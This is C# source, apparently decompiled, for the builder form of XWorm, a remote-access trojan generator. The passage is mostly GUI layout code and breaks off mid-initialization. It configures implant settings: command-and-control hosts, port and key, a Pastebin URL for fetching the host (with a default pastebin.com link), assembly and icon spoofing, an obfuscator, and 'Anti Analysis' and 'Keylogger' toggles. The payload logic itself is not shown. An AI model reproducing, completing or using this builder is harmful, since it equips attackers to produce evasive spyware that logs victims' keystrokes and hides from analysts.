#define DEBUG
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SimpleObfuscator;
using XWorm.My;


namespace XWorm;

[DesignerGenerated]
public class Builder : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton1")]
	private Guna2GradientButton _Guna2GradientButton1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2TextBox3")]
	private Guna2TextBox _Guna2TextBox3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2TextBox1")]
	private Guna2TextBox _Guna2TextBox1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2TextBox2")]
	private Guna2TextBox _Guna2TextBox2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2CheckBox3")]
	private Guna2CheckBox _Guna2CheckBox3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2CheckBox2")]
	private Guna2CheckBox _Guna2CheckBox2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2CheckBox1")]
	private Guna2CheckBox _Guna2CheckBox1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2ToggleSwitch6")]
	private Guna2ToggleSwitch _Guna2ToggleSwitch6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2ToggleSwitch5")]
	private Guna2ToggleSwitch _Guna2ToggleSwitch5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2CheckBox7")]
	private Guna2CheckBox _Guna2CheckBox7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2CheckBox6")]
	private Guna2CheckBox _Guna2CheckBox6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2CheckBox5")]
	private Guna2CheckBox _Guna2CheckBox5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2CheckBox8")]
	private Guna2CheckBox _Guna2CheckBox8;

	public string string_0;

	public string string_1;

	public bool bool_0;

	public bool bool_1;

	public string string_2;

	public string string_3;

	public string string_4;

	public string string_5;

	public string string_6;

    [field: AccessedThroughProperty("PictureBox1")]
    public PictureBox PictureBox1
    ;

    [field: AccessedThroughProperty("Label3")]
    public Label Label3
    ;

    [field: AccessedThroughProperty("Label1")]
    public Label Label1
    ;

    [field: AccessedThroughProperty("ListBox1")]
    public ListBox ListBox1
    ;

    public Guna2GradientButton Guna2GradientButton1
    ;

    public Guna2TextBox Guna2TextBox3
    ;

    [field: AccessedThroughProperty("Label10")]
    public Label Label10
    ;

    public Guna2TextBox Guna2TextBox1
    ;

    [field: AccessedThroughProperty("Label9")]
    public Label Label9
    ;
    public Guna2TextBox Guna2TextBox2
    ;

    [field: AccessedThroughProperty("Label12")]
    public Label Label12
    ;

    [field: AccessedThroughProperty("Guna2TextBox4")]
    public Guna2TextBox Guna2TextBox4
    ;

    public Guna2CheckBox Guna2CheckBox3
    ;


    [field: AccessedThroughProperty("ImageList1")]
    public ImageList ImageList1
    ;

    [field: AccessedThroughProperty("Guna2CheckBox4")]
    public Guna2CheckBox Guna2CheckBox4
    ;

    public Guna2CheckBox Guna2CheckBox2
    ;

    public Guna2CheckBox Guna2CheckBox1
    ;

    public Guna2ToggleSwitch Guna2ToggleSwitch6
    ;

    [field: AccessedThroughProperty("Label19")]
    public Label Label19
    ;


    public Guna2ToggleSwitch Guna2ToggleSwitch5
;


    [field: AccessedThroughProperty("Label18")]
    public Label Label18
    ;

    [field: AccessedThroughProperty("Guna2ToggleSwitch4")]
    public Guna2ToggleSwitch Guna2ToggleSwitch4


    ;

    [field: AccessedThroughProperty("Label17")]
    public Label Label17
;

    [field: AccessedThroughProperty("Guna2ToggleSwitch3")]
    public Guna2ToggleSwitch Guna2ToggleSwitch3
    ;

    [field: AccessedThroughProperty("Label16")]
    public Label Label16
;

    [field: AccessedThroughProperty("Guna2ToggleSwitch2")]
    public Guna2ToggleSwitch Guna2ToggleSwitch2
    ;

    [field: AccessedThroughProperty("Label15")]
    public Label Label15
    ;

    [field: AccessedThroughProperty("Guna2ToggleSwitch1")]
    public Guna2ToggleSwitch Guna2ToggleSwitch1
    ;

    [field: AccessedThroughProperty("Label14")]
    public Label Label14
    ;

    public Guna2CheckBox Guna2CheckBox7
;

    public Guna2CheckBox Guna2CheckBox6
    ;

    public Guna2CheckBox Guna2CheckBox5
    ;

    [field: AccessedThroughProperty("Guna2TabControl1")]
    public Guna2TabControl Guna2TabControl1
    ;

    [field: AccessedThroughProperty("TabPage1")]
    public TabPage TabPage1
    ;

    [field: AccessedThroughProperty("TabPage2")]
    public TabPage TabPage2
    ;

    [field: AccessedThroughProperty("Guna2TextBox5")]
    public Guna2TextBox Guna2TextBox5
    ;

    [field: AccessedThroughProperty("TabPage3")]
    public TabPage TabPage3
    ;

    [field: AccessedThroughProperty("Guna2TextBox6")]
    public Guna2TextBox Guna2TextBox6
    ;

    public Guna2CheckBox Guna2CheckBox8
    ;


    [field: AccessedThroughProperty("Guna2ComboBox2")]
    public Guna2ComboBox Guna2ComboBox2
    ;

    [field: AccessedThroughProperty("Guna2NumericUpDown1")]
    public Guna2NumericUpDown Guna2NumericUpDown1
    ;

    [field: AccessedThroughProperty("Label13")]
    public Label Label13
    ;

    [field: AccessedThroughProperty("Label20")]
    public Label Label20
    ;

    [field: AccessedThroughProperty("PictureBox4")]
    public PictureBox PictureBox4
    ;

    [field: AccessedThroughProperty("Label2")]
    public Label Label2
    ;

    [field: AccessedThroughProperty("Guna2TextBox7")]
    public Guna2TextBox Guna2TextBox7
    ;

    [field: AccessedThroughProperty("PictureBox2")]
    public PictureBox PictureBox2
    ;

    [field: AccessedThroughProperty("Label4")]
    public Label Label4
    ;

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.Builder));
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.Label3 = new System.Windows.Forms.Label();
		this.Label1 = new System.Windows.Forms.Label();
		this.ListBox1 = new System.Windows.Forms.ListBox();
		this.Guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2TextBox2 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2TextBox1 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Label9 = new System.Windows.Forms.Label();
		this.Guna2TextBox3 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Label10 = new System.Windows.Forms.Label();
		this.Guna2CheckBox3 = new Guna.UI2.WinForms.Guna2CheckBox();
		this.Guna2TextBox4 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Label12 = new System.Windows.Forms.Label();
		this.ImageList1 = new System.Windows.Forms.ImageList(this.components);
		this.Guna2CheckBox2 = new Guna.UI2.WinForms.Guna2CheckBox();
		this.Guna2CheckBox1 = new Guna.UI2.WinForms.Guna2CheckBox();
		this.Guna2CheckBox4 = new Guna.UI2.WinForms.Guna2CheckBox();
		this.Guna2ToggleSwitch1 = new Guna.UI2.WinForms.Guna2ToggleSwitch();
		this.Label14 = new System.Windows.Forms.Label();
		this.Guna2ToggleSwitch2 = new Guna.UI2.WinForms.Guna2ToggleSwitch();
		this.Label15 = new System.Windows.Forms.Label();
		this.Guna2ToggleSwitch3 = new Guna.UI2.WinForms.Guna2ToggleSwitch();
		this.Label16 = new System.Windows.Forms.Label();
		this.Guna2ToggleSwitch4 = new Guna.UI2.WinForms.Guna2ToggleSwitch();
		this.Label17 = new System.Windows.Forms.Label();
		this.Guna2ToggleSwitch5 = new Guna.UI2.WinForms.Guna2ToggleSwitch();
		this.Label18 = new System.Windows.Forms.Label();
		this.Guna2ToggleSwitch6 = new Guna.UI2.WinForms.Guna2ToggleSwitch();
		this.Label19 = new System.Windows.Forms.Label();
		this.Guna2CheckBox5 = new Guna.UI2.WinForms.Guna2CheckBox();
		this.Guna2CheckBox6 = new Guna.UI2.WinForms.Guna2CheckBox();
		this.Guna2CheckBox7 = new Guna.UI2.WinForms.Guna2CheckBox();
		this.Guna2TabControl1 = new Guna.UI2.WinForms.Guna2TabControl();
		this.TabPage1 = new System.Windows.Forms.TabPage();
		this.Label2 = new System.Windows.Forms.Label();
		this.Guna2TextBox7 = new Guna.UI2.WinForms.Guna2TextBox();
		this.TabPage2 = new System.Windows.Forms.TabPage();
		this.Guna2TextBox6 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2CheckBox8 = new Guna.UI2.WinForms.Guna2CheckBox();
		this.Guna2ComboBox2 = new Guna.UI2.WinForms.Guna2ComboBox();
		this.Guna2TextBox5 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2NumericUpDown1 = new Guna.UI2.WinForms.Guna2NumericUpDown();
		this.Label13 = new System.Windows.Forms.Label();
		this.TabPage3 = new System.Windows.Forms.TabPage();
		this.PictureBox2 = new System.Windows.Forms.PictureBox();
		this.Label4 = new System.Windows.Forms.Label();
		this.PictureBox4 = new System.Windows.Forms.PictureBox();
		this.Label20 = new System.Windows.Forms.Label();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		this.Guna2TabControl1.SuspendLayout();
		this.TabPage1.SuspendLayout();
		this.TabPage2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.Guna2NumericUpDown1).BeginInit();
		this.TabPage3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox2).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.PictureBox4).BeginInit();
		base.SuspendLayout();
        this.Guna2GradientButton1.Click += new System.EventHandler(Guna2GradientButton1_Click);
        this.Guna2TextBox3.TextChanged += new System.EventHandler(Guna2TextBox3_TextChanged);
        this.Guna2TextBox1.TextChanged += new System.EventHandler(Guna2TextBox1_TextChanged);
        this.Guna2TextBox2.KeyDown += new System.Windows.Forms.KeyEventHandler(Guna2TextBox2_KeyDown);
        this.Guna2TextBox2.IconRightClick += new System.EventHandler(Guna2TextBox2_IconRightClick);
        this.Guna2TextBox2.IconLeftClick += new System.EventHandler(Guna2TextBox2_IconLeftClick);
        this.Guna2CheckBox1.CheckedChanged += new System.EventHandler(Guna2CheckBox1_CheckedChanged);
        this.Guna2CheckBox2.CheckedChanged += new System.EventHandler(Guna2CheckBox2_CheckedChanged);
        this.Guna2CheckBox3.CheckedChanged += new System.EventHandler(Guna2CheckBox3_CheckedChanged);
        this.Guna2ToggleSwitch6.MouseClick
             += new System.Windows.Forms.MouseEventHandler(Guna2ToggleSwitch6_MouseClick);
        this.Guna2ToggleSwitch5.MouseClick
             += new System.Windows.Forms.MouseEventHandler(Guna2ToggleSwitch6_MouseClick);
        this.Guna2CheckBox8.TextChanged += new System.EventHandler(Guna2CheckBox8_CheckedChanged);
        this.Guna2CheckBox7.TextChanged += new System.EventHandler(Guna2CheckBox7_CheckedChanged);
        this.Guna2CheckBox6.TextChanged += new System.EventHandler(Guna2CheckBox6_CheckedChanged);
        this.Guna2CheckBox5.TextChanged += new System.EventHandler(Guna2CheckBox5_CheckedChanged);
        this.PictureBox1.Location = new System.Drawing.Point(392, 138);
		this.PictureBox1.Name = "PictureBox1";
		this.PictureBox1.Size = new System.Drawing.Size(32, 32);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.PictureBox1.TabIndex = 21;
		this.PictureBox1.TabStop = false;
		this.Label3.AutoSize = true;
		this.Label3.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label3.ForeColor = System.Drawing.Color.Black;
		this.Label3.Location = new System.Drawing.Point(45, 75);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(36, 13);
		this.Label3.TabIndex = 29;
		this.Label3.Text = "Host :";
		this.Label1.AutoSize = true;
		this.Label1.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label1.ForeColor = System.Drawing.Color.Black;
		this.Label1.Location = new System.Drawing.Point(40, 10);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(41, 13);
		this.Label1.TabIndex = 28;
		this.Label1.Text = "Hosts :";
		this.ListBox1.BackColor = System.Drawing.Color.White;
		this.ListBox1.ForeColor = System.Drawing.Color.Black;
		this.ListBox1.FormattingEnabled = true;
		this.ListBox1.Location = new System.Drawing.Point(87, 10);
		this.ListBox1.Name = "ListBox1";
		this.ListBox1.Size = new System.Drawing.Size(307, 56);
		this.ListBox1.TabIndex = 27;
		this.Guna2GradientButton1.BorderRadius = 4;
		this.Guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton1.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton1.Image = (System.Drawing.Image)resources.GetObject("Guna2GradientButton1.Image");
		this.Guna2GradientButton1.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton1.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton1.Location = new System.Drawing.Point(15, 176);
		this.Guna2GradientButton1.Name = "Guna2GradientButton1";
		this.Guna2GradientButton1.Size = new System.Drawing.Size(409, 34);
		this.Guna2GradientButton1.TabIndex = 51;
		this.Guna2GradientButton1.Text = "Build";
		this.Guna2TextBox2.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox2.BorderRadius = 3;
		this.Guna2TextBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox2.DefaultText = "";
		this.Guna2TextBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox2.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox2.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.IconLeft = (System.Drawing.Image)resources.GetObject("Guna2TextBox2.IconLeft");
		this.Guna2TextBox2.IconRight = (System.Drawing.Image)resources.GetObject("Guna2TextBox2.IconRight");
		this.Guna2TextBox2.Location = new System.Drawing.Point(87, 72);
		this.Guna2TextBox2.Name = "Guna2TextBox2";
		this.Guna2TextBox2.PasswordChar = '\0';
		this.Guna2TextBox2.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox2.PlaceholderText = "";
		this.Guna2TextBox2.SelectedText = "";
		this.Guna2TextBox2.Size = new System.Drawing.Size(307, 21);
		this.Guna2TextBox2.TabIndex = 47;
		this.Guna2TextBox1.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox1.BorderRadius = 3;
		this.Guna2TextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox1.DefaultText = "<123456789>";
		this.Guna2TextBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Location = new System.Drawing.Point(87, 130);
		this.Guna2TextBox1.Name = "Guna2TextBox1";
		this.Guna2TextBox1.PasswordChar = '\0';
		this.Guna2TextBox1.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.PlaceholderText = "";
		this.Guna2TextBox1.SelectedText = "";
		this.Guna2TextBox1.Size = new System.Drawing.Size(307, 21);
		this.Guna2TextBox1.TabIndex = 49;
		this.Label9.AutoSize = true;
		this.Label9.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label9.ForeColor = System.Drawing.Color.Black;
		this.Label9.Location = new System.Drawing.Point(49, 133);
		this.Label9.Name = "Label9";
		this.Label9.Size = new System.Drawing.Size(32, 13);
		this.Label9.TabIndex = 48;
		this.Label9.Text = "Key :";
		this.Guna2TextBox3.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox3.BorderRadius = 3;
		this.Guna2TextBox3.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox3.DefaultText = "7000";
		this.Guna2TextBox3.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox3.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox3.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox3.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox3.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox3.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox3.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox3.Location = new System.Drawing.Point(87, 103);
		this.Guna2TextBox3.Name = "Guna2TextBox3";
		this.Guna2TextBox3.PasswordChar = '\0';
		this.Guna2TextBox3.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox3.PlaceholderText = "";
		this.Guna2TextBox3.SelectedText = "";
		this.Guna2TextBox3.Size = new System.Drawing.Size(307, 21);
		this.Guna2TextBox3.TabIndex = 51;
		this.Label10.AutoSize = true;
		this.Label10.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label10.ForeColor = System.Drawing.Color.Black;
		this.Label10.Location = new System.Drawing.Point(47, 107);
		this.Label10.Name = "Label10";
		this.Label10.Size = new System.Drawing.Size(34, 13);
		this.Label10.TabIndex = 50;
		this.Label10.Text = "Port :";
		this.Guna2CheckBox3.AutoSize = true;
		this.Guna2CheckBox3.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox3.CheckedState.BorderRadius = 0;
		this.Guna2CheckBox3.CheckedState.BorderThickness = 0;
		this.Guna2CheckBox3.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox3.Location = new System.Drawing.Point(87, 187);
		this.Guna2CheckBox3.Name = "Guna2CheckBox3";
		this.Guna2CheckBox3.Size = new System.Drawing.Size(67, 17);
		this.Guna2CheckBox3.TabIndex = 66;
		this.Guna2CheckBox3.Text = "Pastebin";
		this.Guna2CheckBox3.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox3.UncheckedState.BorderRadius = 0;
		this.Guna2CheckBox3.UncheckedState.BorderThickness = 0;
		this.Guna2CheckBox3.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2TextBox4.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox4.BorderRadius = 3;
		this.Guna2TextBox4.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox4.DefaultText = "https://pastebin.com/raw/H3wFXmEi";
		this.Guna2TextBox4.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox4.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox4.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox4.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox4.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox4.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox4.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox4.Location = new System.Drawing.Point(87, 210);
		this.Guna2TextBox4.Name = "Guna2TextBox4";
		this.Guna2TextBox4.PasswordChar = '\0';
		this.Guna2TextBox4.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox4.PlaceholderText = "";
		this.Guna2TextBox4.SelectedText = "";
		this.Guna2TextBox4.Size = new System.Drawing.Size(307, 21);
		this.Guna2TextBox4.TabIndex = 67;
		this.Label12.AutoSize = true;
		this.Label12.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label12.ForeColor = System.Drawing.Color.Black;
		this.Label12.Location = new System.Drawing.Point(48, 214);
		this.Label12.Name = "Label12";
		this.Label12.Size = new System.Drawing.Size(33, 13);
		this.Label12.TabIndex = 68;
		this.Label12.Text = "URL :";
		this.ImageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("ImageList1.ImageStream");
		this.ImageList1.TransparentColor = System.Drawing.Color.Transparent;
		this.Guna2CheckBox2.AutoSize = true;
		this.Guna2CheckBox2.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox2.CheckedState.BorderRadius = 0;
		this.Guna2CheckBox2.CheckedState.BorderThickness = 0;
		this.Guna2CheckBox2.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox2.Location = new System.Drawing.Point(339, 138);
		this.Guna2CheckBox2.Name = "Guna2CheckBox2";
		this.Guna2CheckBox2.Size = new System.Drawing.Size(47, 17);
		this.Guna2CheckBox2.TabIndex = 70;
		this.Guna2CheckBox2.Text = "Icon";
		this.Guna2CheckBox2.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox2.UncheckedState.BorderRadius = 0;
		this.Guna2CheckBox2.UncheckedState.BorderThickness = 0;
		this.Guna2CheckBox2.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox1.AutoSize = true;
		this.Guna2CheckBox1.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox1.CheckedState.BorderRadius = 0;
		this.Guna2CheckBox1.CheckedState.BorderThickness = 0;
		this.Guna2CheckBox1.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox1.Location = new System.Drawing.Point(262, 138);
		this.Guna2CheckBox1.Name = "Guna2CheckBox1";
		this.Guna2CheckBox1.Size = new System.Drawing.Size(71, 17);
		this.Guna2CheckBox1.TabIndex = 69;
		this.Guna2CheckBox1.Text = "Assembly";
		this.Guna2CheckBox1.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox1.UncheckedState.BorderRadius = 0;
		this.Guna2CheckBox1.UncheckedState.BorderThickness = 0;
		this.Guna2CheckBox1.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox4.AutoSize = true;
		this.Guna2CheckBox4.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox4.CheckedState.BorderRadius = 0;
		this.Guna2CheckBox4.CheckedState.BorderThickness = 0;
		this.Guna2CheckBox4.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2CheckBox4.Location = new System.Drawing.Point(176, 138);
		this.Guna2CheckBox4.Name = "Guna2CheckBox4";
		this.Guna2CheckBox4.Size = new System.Drawing.Size(80, 17);
		this.Guna2CheckBox4.TabIndex = 74;
		this.Guna2CheckBox4.Text = "Obfuscator";
		this.Guna2CheckBox4.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2CheckBox4.UncheckedState.BorderRadius = 0;
		this.Guna2CheckBox4.UncheckedState.BorderThickness = 0;
		this.Guna2CheckBox4.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2ToggleSwitch1.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ToggleSwitch1.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ToggleSwitch1.CheckedState.InnerBorderColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch1.CheckedState.InnerColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch1.Location = new System.Drawing.Point(224, 55);
		this.Guna2ToggleSwitch1.Name = "Guna2ToggleSwitch1";
		this.Guna2ToggleSwitch1.Size = new System.Drawing.Size(35, 20);
		this.Guna2ToggleSwitch1.TabIndex = 76;
		this.Guna2ToggleSwitch1.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2ToggleSwitch1.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2ToggleSwitch1.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch1.UncheckedState.InnerColor = System.Drawing.Color.White;
		this.Label14.AutoSize = true;
		this.Label14.Location = new System.Drawing.Point(265, 59);
		this.Label14.Name = "Label14";
		this.Label14.Size = new System.Drawing.Size(68, 13);
		this.Label14.TabIndex = 75;
		this.Label14.Text = "Anti Analysis";
		this.Guna2ToggleSwitch2.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ToggleSwitch2.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ToggleSwitch2.CheckedState.InnerBorderColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch2.CheckedState.InnerColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch2.Location = new System.Drawing.Point(112, 55);
		this.Guna2ToggleSwitch2.Name = "Guna2ToggleSwitch2";
		this.Guna2ToggleSwitch2.Size = new System.Drawing.Size(35, 20);
		this.Guna2ToggleSwitch2.TabIndex = 78;
		this.Guna2ToggleSwitch2.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2ToggleSwitch2.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2ToggleSwitch2.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch2.UncheckedState.InnerColor = System.Drawing.Color.White;
		this.Label15.AutoSize = true;
		this.Label15.Location = new System.Drawing.Point(153, 59);
		this.Label15.Name = "Label15";
		this.Label15.Size = new System.Drawing.Size(55, 13);
		this.Label15.TabIndex = 77;
		this.Label15.Text = "Keylogger";
		this.Guna2ToggleSwitch3.CheckedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ToggleSwitch3.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ToggleSwitch3.CheckedState.InnerBorderColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch3.CheckedState.InnerColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch3.Location = new System.Drawing.Point(24, 29);
		this.Guna2ToggleSwitch3.Name = "Guna2ToggleSwitch3";
